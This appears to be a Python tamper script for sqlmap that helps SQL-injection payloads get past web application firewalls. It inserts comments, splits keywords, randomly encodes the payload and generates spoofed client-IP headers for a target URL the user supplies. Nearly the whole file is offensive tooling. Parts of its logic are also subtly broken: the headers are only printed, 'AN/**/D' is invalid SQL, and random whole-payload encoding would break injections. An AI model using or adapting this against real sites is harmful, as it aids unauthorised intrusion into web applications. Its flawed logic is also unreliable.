import socket
import random
from urllib.parse import urlparse
import base64
import urllib.parse

# Helper function to resolve the origin IP
def resolve_origin_ip(url):
    try:
        # Parse the URL to extract the domain
        domain = urlparse(url).netloc.split(':')[0]
        # Resolve the domain to an IP address
        origin_ip = socket.gethostbyname(domain)
        return origin_ip
    except Exception as e:
        print(f"[ERROR] Failed to resolve origin IP: {e}")
        return None

# Random IP generator for obfuscation
def random_ip():
    return ".".join(str(random.randint(1, 255)) for _ in range(4))

# Random encoding techniques
def random_encoding(payload):
    encodings = [
        lambda x: urllib.parse.quote(x),  # URL encoding
        lambda x: base64.b64encode(x.encode()).decode(),  # Base64 encoding
        lambda x: ''.join([f"\\x{ord(c):02x}" for c in x]),  # Hex encoding
    ]
    encoding_func = random.choice(encodings)
    return encoding_func(payload)

def tamper(payload, **kwargs):
    """
    Tamper function to modify the payload and include headers for WAF bypass.

    Args:
        payload (str): Original SQL injection payload.

    Returns:
        str: Modified payload with WAF bypass techniques.
    """
    # Specify your target URL here (sqlmap doesn't provide it directly in tamper scripts)
    target_url = "https://example.com"  # Replace with your target URL

    # Resolve the origin IP
    origin_ip = resolve_origin_ip(target_url)
    if not origin_ip:
        print("[ERROR] Unable to resolve origin IP. Proceeding without it.")
        origin_ip = random_ip()

    # Generate WAF-bypassing headers (for debugging purposes only)
    waf_headers = {
        "X-Forwarded-For": origin_ip,
        "Client-IP": random_ip(),
        "True-Client-IP": origin_ip,
        "X-Real-IP": origin_ip,
        "Forwarded": f"for={random_ip()};proto=http;by={origin_ip}",
    }

    # Print headers for debugging
    print("[INFO] Generated WAF Bypass Headers:")
    for header, value in waf_headers.items():
        print(f"{header}: {value}")

    # Modify the payload for WAF bypass
    payload = payload.replace(" ", "/**/")  # Replace spaces with comments
    payload = payload.replace("AND", "AN/**/D")  # Split keywords for obfuscation

    # Apply random encoding
    payload = random_encoding(payload)

    return payload
